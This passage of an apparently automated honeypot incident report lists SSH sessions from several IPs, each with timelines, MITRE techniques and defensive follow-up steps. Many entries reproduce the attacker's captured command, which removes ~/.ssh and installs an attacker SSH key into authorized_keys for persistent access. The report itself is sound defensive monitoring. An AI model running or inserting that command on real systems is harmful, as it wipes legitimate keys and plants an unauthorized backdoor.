| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:54:39` | `cowrie.session.connect` |
| `2026-04-14 11:54:39` | `cowrie.client.version` |
| `2026-04-14 11:54:40` | `cowrie.client.kex` |
| `2026-04-14 11:54:41` | `cowrie.login.success` |
| `2026-04-14 11:54:42` | `cowrie.session.params` |
| `2026-04-14 11:54:42` | `cowrie.command.input` |
| `2026-04-14 11:54:42` | `cowrie.command.failed` |
| `2026-04-14 11:54:42` | `cowrie.log.closed` |
| `2026-04-14 11:54:43` | `cowrie.session.params` |
| `2026-04-14 11:54:43` | `cowrie.command.input` |
| `2026-04-14 11:54:43` | `cowrie.session.file_download` |
| `2026-04-14 11:54:43` | `cowrie.log.closed` |
| `2026-04-14 11:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ab1fd4e910b

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 11:54 |
| **Last Seen** | 2026-04-14 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:54:46` | `cowrie.session.connect` |
| `2026-04-14 11:54:46` | `cowrie.client.version` |
| `2026-04-14 11:54:46` | `cowrie.client.kex` |
| `2026-04-14 11:54:47` | `cowrie.login.success` |
| `2026-04-14 11:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0750a46a49d2

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 11:58 |
| **Last Seen** | 2026-04-14 11:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:58:14` | `cowrie.session.connect` |
| `2026-04-14 11:58:14` | `cowrie.client.version` |
| `2026-04-14 11:58:14` | `cowrie.client.kex` |
| `2026-04-14 11:58:15` | `cowrie.login.success` |
| `2026-04-14 11:58:16` | `cowrie.session.params` |
| `2026-04-14 11:58:16` | `cowrie.command.input` |
| `2026-04-14 11:58:16` | `cowrie.command.failed` |
| `2026-04-14 11:58:16` | `cowrie.log.closed` |
| `2026-04-14 11:58:16` | `cowrie.session.params` |
| `2026-04-14 11:58:16` | `cowrie.command.input` |
| `2026-04-14 11:58:17` | `cowrie.session.file_download` |
| `2026-04-14 11:58:17` | `cowrie.log.closed` |
| `2026-04-14 11:58:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a151491cb1b

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 11:58 |
| **Last Seen** | 2026-04-14 11:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:58:20` | `cowrie.session.connect` |
| `2026-04-14 11:58:20` | `cowrie.client.version` |
| `2026-04-14 11:58:20` | `cowrie.client.kex` |
| `2026-04-14 11:58:21` | `cowrie.login.success` |
| `2026-04-14 11:58:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0acad55f96fa

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 11:59 |
| **Last Seen** | 2026-04-14 11:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:59:20` | `cowrie.session.connect` |
| `2026-04-14 11:59:20` | `cowrie.client.version` |
| `2026-04-14 11:59:20` | `cowrie.client.kex` |
| `2026-04-14 11:59:21` | `cowrie.login.success` |
| `2026-04-14 11:59:22` | `cowrie.session.params` |
| `2026-04-14 11:59:22` | `cowrie.command.input` |
| `2026-04-14 11:59:22` | `cowrie.command.failed` |
| `2026-04-14 11:59:22` | `cowrie.log.closed` |
| `2026-04-14 11:59:23` | `cowrie.session.params` |
| `2026-04-14 11:59:23` | `cowrie.command.input` |
| `2026-04-14 11:59:23` | `cowrie.session.file_download` |
| `2026-04-14 11:59:23` | `cowrie.log.closed` |
| `2026-04-14 11:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc0f9eae678e

| Field | Detail |
|---|---|
| **Source IP** | `45.169.128[.]70` |
| **First Seen** | 2026-04-14 11:59 |
| **Last Seen** | 2026-04-14 11:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 11:59:27` | `cowrie.session.connect` |
| `2026-04-14 11:59:27` | `cowrie.client.version` |
| `2026-04-14 11:59:27` | `cowrie.client.kex` |
| `2026-04-14 11:59:29` | `cowrie.login.success` |
| `2026-04-14 11:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.128[.]70` to AbuseIPDB if not already reported
- [ ] Block `45.169.128[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2616b763dca8

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:01 |
| **Last Seen** | 2026-04-14 12:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:01:41` | `cowrie.session.connect` |
| `2026-04-14 12:01:41` | `cowrie.client.version` |
| `2026-04-14 12:01:41` | `cowrie.client.kex` |
| `2026-04-14 12:01:42` | `cowrie.login.success` |
| `2026-04-14 12:01:43` | `cowrie.session.params` |
| `2026-04-14 12:01:43` | `cowrie.command.input` |
| `2026-04-14 12:01:43` | `cowrie.command.failed` |
| `2026-04-14 12:01:43` | `cowrie.log.closed` |
| `2026-04-14 12:01:44` | `cowrie.session.params` |
| `2026-04-14 12:01:44` | `cowrie.command.input` |
| `2026-04-14 12:01:44` | `cowrie.session.file_download` |
| `2026-04-14 12:01:44` | `cowrie.log.closed` |
| `2026-04-14 12:01:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5352723e3470

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:01 |
| **Last Seen** | 2026-04-14 12:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:01:47` | `cowrie.session.connect` |
| `2026-04-14 12:01:47` | `cowrie.client.version` |
| `2026-04-14 12:01:47` | `cowrie.client.kex` |
| `2026-04-14 12:01:48` | `cowrie.login.success` |
| `2026-04-14 12:01:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07938a7e00a9

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:03 |
| **Last Seen** | 2026-04-14 12:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:03:34` | `cowrie.session.connect` |
| `2026-04-14 12:03:34` | `cowrie.client.version` |
| `2026-04-14 12:03:34` | `cowrie.client.kex` |
| `2026-04-14 12:03:35` | `cowrie.login.success` |
| `2026-04-14 12:03:36` | `cowrie.session.params` |
| `2026-04-14 12:03:36` | `cowrie.command.input` |
| `2026-04-14 12:03:36` | `cowrie.command.failed` |
| `2026-04-14 12:03:36` | `cowrie.log.closed` |
| `2026-04-14 12:03:36` | `cowrie.session.params` |
| `2026-04-14 12:03:36` | `cowrie.command.input` |
| `2026-04-14 12:03:37` | `cowrie.session.file_download` |
| `2026-04-14 12:03:37` | `cowrie.log.closed` |
| `2026-04-14 12:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20e7726e133c

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:03 |
| **Last Seen** | 2026-04-14 12:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:03:40` | `cowrie.session.connect` |
| `2026-04-14 12:03:40` | `cowrie.client.version` |
| `2026-04-14 12:03:40` | `cowrie.client.kex` |
| `2026-04-14 12:03:41` | `cowrie.login.success` |
| `2026-04-14 12:03:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc977efa0a75

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:07 |
| **Last Seen** | 2026-04-14 12:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:07:17` | `cowrie.session.connect` |
| `2026-04-14 12:07:17` | `cowrie.client.version` |
| `2026-04-14 12:07:17` | `cowrie.client.kex` |
| `2026-04-14 12:07:17` | `cowrie.login.success` |
| `2026-04-14 12:07:18` | `cowrie.session.params` |
| `2026-04-14 12:07:18` | `cowrie.command.input` |
| `2026-04-14 12:07:18` | `cowrie.command.failed` |
| `2026-04-14 12:07:18` | `cowrie.log.closed` |
| `2026-04-14 12:07:18` | `cowrie.session.params` |
| `2026-04-14 12:07:18` | `cowrie.command.input` |
| `2026-04-14 12:07:18` | `cowrie.session.file_download` |
| `2026-04-14 12:07:18` | `cowrie.log.closed` |
| `2026-04-14 12:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db365e18cbf2

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:07 |
| **Last Seen** | 2026-04-14 12:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:07:20` | `cowrie.session.connect` |
| `2026-04-14 12:07:20` | `cowrie.client.version` |
| `2026-04-14 12:07:20` | `cowrie.client.kex` |
| `2026-04-14 12:07:21` | `cowrie.login.success` |
| `2026-04-14 12:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7adf7f1f6fac

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:10 |
| **Last Seen** | 2026-04-14 12:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:10:31` | `cowrie.session.connect` |
| `2026-04-14 12:10:31` | `cowrie.client.version` |
| `2026-04-14 12:10:31` | `cowrie.client.kex` |
| `2026-04-14 12:10:32` | `cowrie.login.success` |
| `2026-04-14 12:10:32` | `cowrie.session.params` |
| `2026-04-14 12:10:32` | `cowrie.command.input` |
| `2026-04-14 12:10:32` | `cowrie.command.failed` |
| `2026-04-14 12:10:32` | `cowrie.log.closed` |
| `2026-04-14 12:10:32` | `cowrie.session.params` |
| `2026-04-14 12:10:32` | `cowrie.command.input` |
| `2026-04-14 12:10:33` | `cowrie.session.file_download` |
| `2026-04-14 12:10:33` | `cowrie.log.closed` |
| `2026-04-14 12:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d3a5d530ab2

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:10 |
| **Last Seen** | 2026-04-14 12:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:10:35` | `cowrie.session.connect` |
| `2026-04-14 12:10:35` | `cowrie.client.version` |
| `2026-04-14 12:10:35` | `cowrie.client.kex` |
| `2026-04-14 12:10:35` | `cowrie.login.success` |
| `2026-04-14 12:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48eba95197af

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:10 |
| **Last Seen** | 2026-04-14 12:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:10:49` | `cowrie.session.connect` |
| `2026-04-14 12:10:49` | `cowrie.client.version` |
| `2026-04-14 12:10:50` | `cowrie.client.kex` |
| `2026-04-14 12:10:51` | `cowrie.login.success` |
| `2026-04-14 12:10:51` | `cowrie.session.params` |
| `2026-04-14 12:10:51` | `cowrie.command.input` |
| `2026-04-14 12:10:51` | `cowrie.command.failed` |
| `2026-04-14 12:10:51` | `cowrie.log.closed` |
| `2026-04-14 12:10:52` | `cowrie.session.params` |
| `2026-04-14 12:10:52` | `cowrie.command.input` |
| `2026-04-14 12:10:52` | `cowrie.session.file_download` |
| `2026-04-14 12:10:52` | `cowrie.log.closed` |
| `2026-04-14 12:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04da3918654c

| Field | Detail |
|---|---|
| **Source IP** | `34.85.163[.]94` |
| **First Seen** | 2026-04-14 12:10 |
| **Last Seen** | 2026-04-14 12:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:10:55` | `cowrie.session.connect` |
| `2026-04-14 12:10:55` | `cowrie.client.version` |
| `2026-04-14 12:10:56` | `cowrie.client.kex` |
| `2026-04-14 12:10:57` | `cowrie.login.success` |
| `2026-04-14 12:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.85.163[.]94` to AbuseIPDB if not already reported
- [ ] Block `34.85.163[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aae3e6e671e

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-14 12:12 |
| **Last Seen** | 2026-04-14 12:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 12:12:05` | `cowrie.session.connect` |
| `2026-04-14 12:12:05` | `cowrie.client.version` |
| `2026-04-14 12:12:05` | `cowrie.client.kex` |
| `2026-04-14 12:12:06` | `cowrie.login.success` |
| `2026-04-14 12:12:06` | `cowrie.session.params` |
| `2026-04-14 12:12:06` | `cowrie.command.input` |
